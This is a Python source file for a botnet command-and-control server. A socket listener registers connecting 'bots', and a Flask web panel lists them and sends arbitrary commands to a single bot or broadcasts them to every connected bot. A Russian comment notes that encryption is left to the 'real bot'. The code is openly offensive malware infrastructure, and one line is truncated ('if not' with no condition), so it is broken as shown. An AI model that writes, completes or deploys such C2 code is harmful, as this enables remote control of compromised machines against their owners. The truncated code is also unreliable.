# c2_web.py
from flask import Flask, render_template, request, jsonify
import threading
import socket
import json

app = Flask(__name__)

bots = []
bot_id_counter = 0
lock = threading.Lock()

def handle_bot(conn, addr):
    global bot_id_counter
    bot_id = bot_id_counter
    bot_id_counter += 1

    with lock:
        bots.append({"id": bot_id, "conn": conn, "addr": addr, "os": "Unknown", "last_seen": "Just now"})

    try:
        while True:
            data = conn.recv(4096)
            if not 
                break
            try:
                response = json.loads(data.decode())
                print(f"[Bot {bot_id}] {response.get('result', '')}")
            except:
                pass
    except:
        pass
    finally:
        with lock:
            bots[:] = [b for b in bots if b["id"] != bot_id]
        conn.close()

def start_server():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('127.0.0.1', 8888))
    server.listen(5)

    while True:
        conn, addr = server.accept()
        threading.Thread(target=handle_bot, args=(conn, addr), daemon=True).start()

@app.route('/')
def index():
    with lock:
        return render_template('index.html', bots=bots)

@app.route('/send_command', methods=['POST'])
def send_command():
    data = request.json
    bot_id = int(data['bot_id'])
    command = data['command']

    with lock:
        bot = next((b for b in bots if b['id'] == bot_id), None)
    if not bot:
        return jsonify({"error": "Bot not found"}), 404

    # Шифрование будет в реальном боте, здесь — упрощение
    bot['conn'].send(command.encode())
    return jsonify({"status": "sent"})

@app.route('/broadcast', methods=['POST'])
def broadcast():
    command = request.json['command']
    sent = 0
    with lock:
        for bot in bots:
            try:
                bot['conn'].send(command.encode())
                sent += 1
            except:
                pass
    return jsonify({"sent": sent})

if __name__ == '__main__':
    threading.Thread(target=start_server, daemon=True).start()
    app.run(port=5000)